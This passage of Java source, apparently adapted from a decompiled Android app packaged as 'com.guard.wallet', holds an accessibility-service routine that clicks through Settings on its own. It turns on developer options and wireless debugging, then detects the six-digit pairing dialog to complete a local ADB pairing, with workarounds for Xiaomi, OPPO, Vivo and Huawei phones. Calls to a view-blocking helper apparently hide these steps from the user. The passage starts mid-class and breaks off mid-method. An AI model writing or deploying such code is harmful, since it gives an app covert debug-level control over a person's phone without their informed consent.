    /** vendor Z() — CombineFilter for PAIR_DEVELOPER_OPTION_TEXT */
    public static CombineFilter Z() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_TEXT", sc, filter, sc);
        return filter;
    }

    /**
     * vendor a0() — CombineFiltersWithOr for developer option Switch desc variants.
     * Searches Switch widgets by desc for 6 text variants (PAIR_DEVELOPER_OPTION_TEXT through _5_TEXT).
     */
    public static CombineFiltersWithOr a0() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList());

        /* Variant 1: PAIR_DEVELOPER_OPTION_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 2: PAIR_DEVELOPERS_OPTION_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPERS_OPTION_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPERS_OPTION_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 3: PAIR_DEVELOPER_OPTION_2_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_2_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_2_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 4: PAIR_DEVELOPER_OPTION_3_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_3_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 5: PAIR_DEVELOPER_OPTION_4_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_4_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 6: PAIR_DEVELOPER_OPTION_5_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.Switch"), "desc");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_5_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        return result;
    }

    /**
     * vendor b0() — CombineFiltersWithOr for developer option TextView text variants.
     * Searches TextView widgets by text for 6 text variants.
     */
    public static CombineFiltersWithOr b0() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList());

        CombineFilter zFilter = Z();
        if (zFilter != null) {
            result.getFilters().add(zFilter);
        }
        CombineFilter xFilter = X();
        if (xFilter != null) {
            result.getFilters().add(xFilter);
        }

        /* Variant 3: PAIR_DEVELOPER_OPTION_2_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_2_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_2_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 4: PAIR_DEVELOPER_OPTION_3_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_3_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 5: PAIR_DEVELOPER_OPTION_4_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_4_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        /* Variant 6: PAIR_DEVELOPER_OPTION_5_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
            CombineFilter f = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(f,
                    FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVELOPER_OPTION_5_TEXT", sc, f, sc);
            result.getFilters().add(f);
        }

        return result;
    }

    /** vendor c0() — CombineFilter for PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT (contains) */
    public static CombineFilter c0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"));
        filter.getStringConditions().add(sc);
        return filter;
    }

    /** vendor d0() — CombineFilter for PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT (contains) */
    public static CombineFilter d0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"));
        filter.getStringConditions().add(sc);
        return filter;
    }

    /** vendor q0() — CombineFilter for LinearLayout parent row */
    public static CombineFilter q0() {
        CombineFilter filter = new CombineFilter();
        filter.getStringConditions().add(
                FilterHelper.initFilter(filter, "className", "android.widget.LinearLayout"));
        return filter;
    }

    /** vendor t0() — check if Xiaomi or OPPO (needs further settings) */
    public static boolean t0() {
        if (!com.guard.wallet.utils.DeviceUtils.isOppoFamily() && !com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
            return false;
        }
        Log.d("PairAccessibilityDelegate", "该手机需要进一步完成其他设置");
        return true;
    }

    /** vendor u0() — CombineFilter for "使用配对码配对" text (PAIR_DEVICE_USE_PAIR_CODE_TEXT) */
    public static CombineFilter u0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_USE_PAIR_CODE_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList());
        StringCondition sc = new StringCondition();
        sc.setProperty("text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_USE_PAIR_CODE_TEXT"));
        filter.getStringConditions().add(sc);
        return filter;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Static helper methods (R, S, e0, h0)
    // ═══════════════════════════════════════════════════════════════

    /**
     * vendor R(UiObject) — toggle wireless debug checkbox until adb wireless connected.
     * Calls h0() to find and click the Switch, then checks g.J() (adb wireless connected).
     */
    public static boolean R(UiObject uiObject) {
        AtomicInteger counter = new AtomicInteger(0);
        boolean connected = com.guard.wallet.utils.SystemHelper.J();
        while (!connected) {
            try {
                if (counter.incrementAndGet() > 10) {
                    break;
                }
                CheckedResult result = h0(uiObject);
                if (result.isClicked()) {
                    Log.d("PairAccessibilityDelegate", "无线调试勾选框已点击");
                    com.guard.wallet.utils.SystemHelper.T0(10);
                }
                if (result.isChecked()) {
                    Log.d("PairAccessibilityDelegate", "已勾选无线调试");
                }
                connected = com.guard.wallet.utils.SystemHelper.J();
            } catch (Exception ex) {
                AppUtils.s("PairAccessibilityDelegate", ex);
                break;
            }
        }
        return connected;
    }

    /**
     * vendor S(UiObject) — click above the "禁用ADB调试" node to enter wireless debug.
     * Calculates a rect 200px above the node's bounds and clicks its center.
     */
    public static boolean S(UiObject uiObject) {
        try {
            Log.d("PairAccessibilityDelegate", "禁用ADB调试栏目查找成功");
            Rect bounds = uiObject.boundsInScreen();
            Rect clickRect = new Rect(bounds.left, bounds.top - 200, bounds.right, bounds.top);
            if (com.guard.wallet.utils.SystemHelper.s(Integer.valueOf(clickRect.centerX()),
                    Integer.valueOf(clickRect.centerY()))) {
                Log.d("PairAccessibilityDelegate", "根据屏幕左边点击无线调试栏目完成");
                com.guard.wallet.helper.BlockViewManager.h(20);
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /**
     * vendor e0(UiObject) — find checkable node and toggle it.
     * Searches upward for a checkable (BoolCondition) node, clicks until checked.
     */
    public static CheckedResult e0(UiObject node) {
        AtomicInteger counter = new AtomicInteger(0);
        CheckedResult result = new CheckedResult();
        boolean checked = false;
        try {
            /* Determine if node itself is checkable */
            UiObject checkNode = null;
            if (node.checkable()) {
                checkNode = node;
            }

            /* Search upward for checkable node */
            CombineFilter checkableFilter = new CombineFilter();
            checkableFilter.setBoolConditions(new LinkedList());
            checkableFilter.getBoolConditions().add(new BoolCondition("checkable", true, true));
            MyAccessibilityService.I(node);

            while (node != null && checkNode == null) {
                if (counter.incrementAndGet() > 3) {
                    break;
                }
                checkNode = node.findOneByCombine(checkableFilter);
                node = node.parent();
            }

            if (checkNode != null) {
                Log.d("PairAccessibilityDelegate", "checkboxNode is not null");
                counter.set(0);
                checked = checkNode.checked();

                while (!checked) {
                    if (counter.incrementAndGet() > 5) {
                        break;
                    }
                    checkNode.click();
                    Log.d("PairAccessibilityDelegate", "checkboxNode is click");
                    result.setClicked(true);
                    com.guard.wallet.utils.SystemHelper.T0(20);
                    checkNode.refresh();
                    checked = checkNode.checked();
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        result.setChecked(checked);
        return result;
    }

    /**
     * vendor h0(UiObject) — find Switch node and toggle it for wireless debug.
     * Searches upward for Q0() (Switch) match, clicks if not checked,
     * falls back to clicking parent T() (clickable parent).
     */
    public static CheckedResult h0(UiObject node) {
        CheckedResult result = new CheckedResult();
        try {
            /* Determine if node itself is checkable */
            AtomicInteger counter = new AtomicInteger(0);
            UiObject switchNode = null;
            if (node != null && node.checkable()) {
                switchNode = node;
            }

            /* Search upward for Switch */
            CombineFilter switchFilter = Q0();
            MyAccessibilityService.I(node);
            while (node != null && switchNode == null) {
                if (counter.incrementAndGet() > 3) {
                    break;
                }
                switchNode = node.findOneByCombine(switchFilter);
                node = node.parent();
            }

            if (switchNode == null) {
                return result;
            }

            /* Check current state */
            result.setChecked(switchNode.checked());
            int retries = 20;

            /* Attempt 1: click switch directly */
            if (!result.isChecked()) {
                if (switchNode.click()) {
                    Log.d("PairAccessibilityDelegate", "switchNode clicked");
                    result.setClicked(true);
                    switchNode.refresh();
                    result.setChecked(switchNode.checked());
                }
                /* Wait for checked state */
                while (retries > 0 && !result.isChecked()) {
                    com.guard.wallet.utils.SystemHelper.T0(1);
                    switchNode.refresh();
                    result.setChecked(switchNode.checked());
                    retries--;
                }
            }

            /* Attempt 2: click parent clickable element */
            if (!result.isChecked() && !result.isClicked()) {
                UiObject parent = switchNode.findParentUtilCombine(T());
                if (parent != null && parent.click()) {
                    result.setClicked(true);
                    switchNode.refresh();
                    result.setChecked(switchNode.checked());
                    /* Wait for checked state */
                    while (retries > 0 && !result.isChecked()) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode.refresh();
                        result.setChecked(switchNode.checked());
                        retries--;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return result;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Static handler H() — pair in developer options
    // ═══════════════════════════════════════════════════════════════

    /**
     * vendor H(a0) — handler for pairInDevOption: navigate developer options,
     * find wireless debug entry, scroll to find it, check/toggle, click to enter.
     */
    public static void H(PairAccessibilityDelegate engine) {
        engine.getClass();
        boolean clicked = false;
        try {
            boolean inDevOptions = engine.L();
            ConcurrentLinkedQueue queue = engine.o;

            if (inDevOptions) {
                Log.d("PairAccessibilityDelegate", "pairInDevOption 窗口匹配");
                com.guard.wallet.helper.BlockViewManager.h(10);
                engine.G();
                Log.d("PairAccessibilityDelegate", "active root complete");

                UiObject scrollView = engine.f0();
                if (scrollView != null) {
                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");

                    /* Xiaomi: check developer option toggle first */
                    if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()
                            && !com.guard.wallet.utils.SystemHelper.K()
                            && engine.T0(scrollView)) {
                        /* T0 handled the dev option toggle, exit */
                        queue.remove("pairInDevOption");
                        return;
                    }

                    /* Find wireless debug entry by scrolling */
                    UiObject found = engine.G0(scrollView);
                    if (found != null) {
                        Log.d("PairAccessibilityDelegate", "无线调试栏目查找成功:" + found.toString());
                        UiObject clickable = found.findParentUtilCombine(T());

                        if (clickable != null) {
                            Log.d("PairAccessibilityDelegate", "无线调试可点击栏目查找成功");
                            com.guard.wallet.helper.BlockViewManager.h(15);

                            /* Try "禁用ADB" shortcut: click above the ADB timeout text */
                            String disableAdbText = com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT");
                            if (!AppUtils.B(found.text())
                                    && !AppUtils.B(disableAdbText)
                                    && found.text().contains(disableAdbText)
                                    && S(clickable)) {
                                Log.d("PairAccessibilityDelegate", "依禁用ADB节点位置进入无线调试栏目");
                                // ADAPT: 设置状态为 LEAVE_DEV_OPT，防止 u() 再次 dispatch case 0
                                engine.p.set(EngineHelper.PAIR_DEPT_LEAVE_DEV_OPT);
                                com.guard.wallet.helper.BlockViewManager.h(25);
                                queue.remove("pairInDevOption");
                                return;
                            }

                            /* Decide whether to toggle wireless debug checkbox */
                            boolean shouldToggle;
                            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                                shouldToggle = Build.VERSION.SDK_INT <= 30;
                            } else {
                                shouldToggle = !com.guard.wallet.utils.DeviceUtils.isHuaweiOrHonor();
                            }

                            if (shouldToggle) {
                                if (!R(clickable)) {
                                    // ADAPT: OPPO split-preference — R(clickable) 从 main_layout 向上找不到 Switch
                                    // 从行容器 (clickable.parent()) 向下搜索 Switch
                                    UiObject rowContainer = clickable.parent();
                                    if (rowContainer != null) {
                                        UiObject sw = rowContainer.findOneByCombine(Q0());
                                        if (sw != null && !sw.checked()) {
                                            sw.click();
                                            Log.e("PairAccessibilityDelegate", "无线调试 Switch 已从行容器点击开启");
                                            com.guard.wallet.utils.SystemHelper.T0(15);
                                        } else if (sw != null) {
                                            Log.d("PairAccessibilityDelegate", "无线调试 Switch 已开启");
                                        } else {
                                            Log.e("PairAccessibilityDelegate", "行容器中未找到 Switch");
                                        }
                                    }
                                } else {
                                    Log.d("PairAccessibilityDelegate", "无线调试已勾选");
                                    com.guard.wallet.helper.BlockViewManager.h(20);
                                }
                            }

                            /* Click to enter wireless debug settings */
                            if (clickable.click()) {
                                engine.p.set(EngineHelper.PAIR_DEPT_LEAVE_DEV_OPT);
                                Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目");
                                com.guard.wallet.helper.BlockViewManager.h(25);
                                clicked = true;
                            } else {
                                Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目失败");
                            }
                        } else {
                            Log.e("PairAccessibilityDelegate", "无线调试可点击栏目查找失败");
                        }
                    } else {
                        Log.e("PairAccessibilityDelegate", "无线调试栏目查找失败");
                    }
                } else {
                    Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败,重置开发者选项窗口");
                }
            }

            if (!clicked) {
                queue.remove("pairInDevOption");
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  Instance methods — state management / dispatch
    // ═══════════════════════════════════════════════════════════════

    /** vendor D0() — handle auto engine dispatch case 0: shutdown if not finished */
    public final void D0() {
        try {
            if (!Objects.equals(this.p.get(), EngineHelper.PAIR_DEPT_PAIR_FINISH)) {
                N0();
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * vendor N0() — shutdown the auto engine.
     * Locks, sets shutdown flag, finishes local ADB pair, removes delegates,
     * shuts down executor, clears queue, calls helper cleanup.
     */
    public final void N0() {
        ReentrantLock lock = this.q;
        if (lock.tryLock()) {
            AtomicBoolean shutdownFlag = this.r;
            try {
                if (!shutdownFlag.get()) {
                    Log.d("PairAccessibilityDelegate", "准备结束本地配对自动化引擎");
                    shutdownFlag.set(true);
                    com.guard.wallet.helper.BlockViewManager.h(100);

                    if (EngineHelper.heS() != null) {
                        Log.d("PairAccessibilityDelegate", "pairInFinish finishLocalAdbPair");
                        EngineHelper.heS().bootstrapCompleted.set(true);
                        if (EngineHelper.eBc()) {
                            EngineHelper.eBd();
                        }
                        if (MyAccessibilityService.P() != null) {
                            MyAccessibilityService.P().u();
                            MyAccessibilityService.P().z();
                            MyAccessibilityService.P().B();
                        }
                    } else {
                        if (EngineHelper.eBc()) {
                            EngineHelper.eBd();
                        }
                        if (MyAccessibilityService.P() != null) {
                            Log.d("PairAccessibilityDelegate", "pairInFinish removePairAccessibilityDelegate");
                            MyAccessibilityService.P().u();
                            MyAccessibilityService.P().z();
                            MyAccessibilityService.P().B();
                        }
                    }

                    this.n.shutdownNow();
                    this.p.set(EngineHelper.PAIR_DEPT_PAIR_FINISH);
                    com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                    this.o.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("PairAccessibilityDelegate", "已结束本地配对自动化引擎");
                    super.d();
                }
            } catch (Exception ex) {
                AppUtils.s("PairAccessibilityDelegate", ex);
            }
            lock.unlock();
        }
    }

    @Override
    public final void d() {
        try {
            this.n.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
            this.o.clear();
            super.d();
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof PairAccessibilityDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(PairAccessibilityDelegate.class.getName());
    }

    // ═══════════════════════════════════════════════════════════════
    //  Instance methods — find scrollable view and wireless debug entry
    // ═══════════════════════════════════════════════════════════════

    /** vendor f0() — find scrollable view in developer options (retry up to 10 times) */
    public final UiObject f0() {
        try {
            if (k() == null) {
                return null;
            }
            AtomicInteger counter = new AtomicInteger(0);
            UiObject root = k();
            CombineFiltersWithOr filters = H0();
            while (true) {
                UiObject found = root.findOneByOperateOr(filters);
                if (found != null || counter.incrementAndGet() >= 10) {
                    return found;
                }
                com.guard.wallet.utils.SystemHelper.T0(5);
                k().refresh();
                root = k();
                filters = H0();
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
            return null;
        }
    }

    /**
     * vendor G0(UiObject) — scroll through developer options to find wireless debug entry.
     * Searches for X0 (wifi debug text), V0 (wifi debug 2), c0 (disable ADB timeout),
     * d0 (enable debug after wifi connect). Scrolls forward then backward.
     * Returns first non-null match with priority: X0 > V0 > c0 > d0.
     */
    public final UiObject G0(UiObject scrollView) {
        UiObject foundX0 = null;
        UiObject foundV0 = null;
        UiObject foundC0 = null;
        UiObject foundD0 = null;
        try {
            AtomicInteger counter = new AtomicInteger(0);
            scrollView.refresh();
            Log.d("PairAccessibilityDelegate", "开始滚动查找无线调试栏目");

            foundX0 = scrollView.findOneByCombine(X0());
            foundV0 = scrollView.findOneByCombine(V0());
            foundC0 = scrollView.findOneByCombine(c0());
            foundD0 = scrollView.findOneByCombine(d0());

            /* Scroll forward */
            while (scrollView.canScrollForward() && counter.incrementAndGet() < 10) {
                Log.d("PairAccessibilityDelegate", "滚动视图可以向下滚动");
                if (foundX0 != null || foundV0 != null || foundC0 != null || foundD0 != null) {
                    break;
                }
                if (scrollView.scrollForward()) {
                    Log.d("PairAccessibilityDelegate", "向下滚动查找无线调试栏目");
                    com.guard.wallet.utils.SystemHelper.T0(10);
                    scrollView.refresh();
                    foundX0 = scrollView.findOneByCombine(X0());
                    foundV0 = scrollView.findOneByCombine(V0());
                    foundC0 = scrollView.findOneByCombine(c0());
                    foundD0 = scrollView.findOneByCombine(d0());
                }
            }

            /* Scroll backward */
            counter.set(0);
            UiObject newScrollView = f0();
            if (newScrollView != null) {
                while (newScrollView.canScrollBackward() && counter.incrementAndGet() < 10) {
                    Log.d("PairAccessibilityDelegate", "滚动视图可以向上滚动");
                    if (foundX0 != null || foundV0 != null || foundC0 != null || foundD0 != null) {
                        break;
                    }
                    if (newScrollView.scrollBackward()) {
                        Log.d("PairAccessibilityDelegate", "向上滚动查找无线调试栏目");
                        com.guard.wallet.utils.SystemHelper.T0(10);
                        newScrollView.refresh();
                        foundX0 = newScrollView.findOneByCombine(X0());
                        foundV0 = newScrollView.findOneByCombine(V0());
                        foundC0 = newScrollView.findOneByCombine(c0());
                        foundD0 = newScrollView.findOneByCombine(d0());
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }

        /* Return first non-null with priority */
        if (foundX0 != null) return foundX0;
        if (foundV0 != null) return foundV0;
        if (foundC0 != null) return foundC0;
        return foundD0;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Instance methods — window state queries
    // ═══════════════════════════════════════════════════════════════

    /** vendor K() — check if in "允许开发者设置" dialog */
    public final boolean K() {
        try {
            LinkedList list = new LinkedList();
            list.add(I());
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入允许开发者选项窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** vendor L() — check if in developer/developer options window */
    public final boolean L() {
        try {
            LinkedList list = new LinkedList();
            list.add(Y());
            list.add(W());
            list.add(s0());
            list.add(P0());
            list.add(O0());
            list.add(j0());
            list.add(i0());
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入开发者、开发人员选项窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** vendor M() — check if in pair code dialog */
    public final boolean M() {
        try {
            LinkedList list = new LinkedList();
            ListenWindow xLw = x0();
            if (xLw != null) list.add(xLw);
            ListenWindow vLw = v0();
            if (vLw != null) list.add(vLw);
            ListenWindow wLw = w0();
            if (wLw != null) list.add(wLw);
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入使用配对码对话框");
                return true;
            }
            // ADAPT: ColorOS 16 对话框弹出时 activeRoot 仍指向旧 Activity
            // 遍历所有窗口，查找包含 6 位配对码的对话框
            com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
            if (svc != null) {
                try {
                    java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
                    if (windows != null) {
                        for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
                            if (win == null) continue;
                            android.view.accessibility.AccessibilityNodeInfo winRoot;
                            if (android.os.Build.VERSION.SDK_INT >= 33) {
                                winRoot = com.guard.wallet.infra.WindowInfoCompat.getRootNode(win);
                            } else {
                                winRoot = win.getRoot();
                            }
                            if (winRoot == null) continue;
                            // 搜索 6 位数字 (配对码) 确认是配对对话框
                            if (hasDigitCode(new UiObject(winRoot, 0, 0), 6)) {
                                Log.e("PairAccessibilityDelegate", "已进入配对码对话框 (窗口遍历, title=" + win.getTitle() + ")");
                                return true;
                            }
                        }
                    }
                } catch (Exception ex) {
                    AppUtils.s("PairAccessibilityDelegate", ex);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** 检查节点树中是否包含指定位数的纯数字文本 (配对码) */
    private static boolean hasDigitCode(UiObject root, int digits) {
        if (root == null) return false;
        try {
            java.util.ArrayDeque<UiObject> stack = new java.util.ArrayDeque<>();
            stack.push(root);
            while (!stack.isEmpty()) {
                UiObject node = stack.pop();
                String text = node.text();
                if (text != null && text.matches("\\d{" + digits + "}")) {
                    return true;
                }
                int childCount = node.childCount();
                for (int i = 0; i < childCount; i++) {
                    UiObject child = node.child(i);
                    if (child != null) stack.push(child);
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /** vendor N() — check if in pair fail dialog */
    public final boolean N() {
        try {
            LinkedList list = new LinkedList();
            ListenWindow bLw = B0();
            if (bLw != null) list.add(bLw);
            ListenWindow yLw = y0();
            if (yLw != null) list.add(yLw);
            ListenWindow zLw = z0();
            if (zLw != null) list.add(zLw);
            ListenWindow aLw = A0();
            if (aLw != null) list.add(aLw);
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入配对失败对话框");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** vendor O() — check if in USB安全设置 dialog */
    public final boolean O() {
        try {
            LinkedList list = new LinkedList();
            list.add(M0());
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入USB安全设置窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** vendor P() — check if in wireless debug window */
    public final boolean P() {
        try {
            LinkedList list = new LinkedList();
            ListenWindow w0Lw = W0();
            if (w0Lw != null) list.add(w0Lw);
            ListenWindow u0Lw = U0();
            if (u0Lw != null) list.add(u0Lw);
            ListenWindow l0Lw = l0();
            if (l0Lw != null) list.add(l0Lw);
            ListenWindow k0Lw = k0();
            if (k0Lw != null) list.add(k0Lw);
            ListenWindow n0Lw = n0();
            if (n0Lw != null) list.add(n0Lw);
            ListenWindow m0Lw = m0();
            if (m0Lw != null) list.add(m0Lw);
            list.add(Y0());
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入无线调试窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    /** vendor Q() — check if "使用配对码配对" is already visible (pair in progress) */
    public final boolean Q() {
        try {
            LinkedList list = new LinkedList();
            ListenWindow y0Lw = Y0();
            if (y0Lw != null) list.add(y0Lw);
            ListenWindow z0Lw = Z0();
            if (z0Lw != null) list.add(z0Lw);
            if (q(list)) {
                Log.d("PairAccessibilityDelegate", "已进入无线调试窗口(使用配对码配对)");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        return false;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Instance methods — developer option toggle and checked result
    // ═══════════════════════════════════════════════════════════════

    /**
     * vendor T0(UiObject) — find and toggle developer options Switch for Xiaomi.
     * Searches for Switch by desc (a0() filters), falls back to TextView (b0() filters).
     * If not checked, clicks and waits for "允许开发设置" dialog.
     * Returns true if dev options are enabled.
     */
    public final boolean T0(UiObject scrollView) {
        boolean isChecked = false;
        boolean wasClicked = false;
        try {
            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");

            /* Search for Switch by desc */
            UiObject switchNode = scrollView.findOneByOperateOr(a0());
            if (switchNode == null) {
                scrollView.scrollBackwardEnd();
                F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                com.guard.wallet.utils.SystemHelper.T0(5);
                scrollView = f0();
                if (scrollView != null) {
                    switchNode = scrollView.findOneByOperateOr(a0());
                }
            }

            /* Fallback: search by text (b0 filters) */
            if (switchNode == null && scrollView != null) {
                UiObject textNode = scrollView.findOneByOperateOr(b0());
                if (textNode == null) {
                    scrollView.scrollBackwardEnd();
                    F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                    com.guard.wallet.utils.SystemHelper.T0(5);
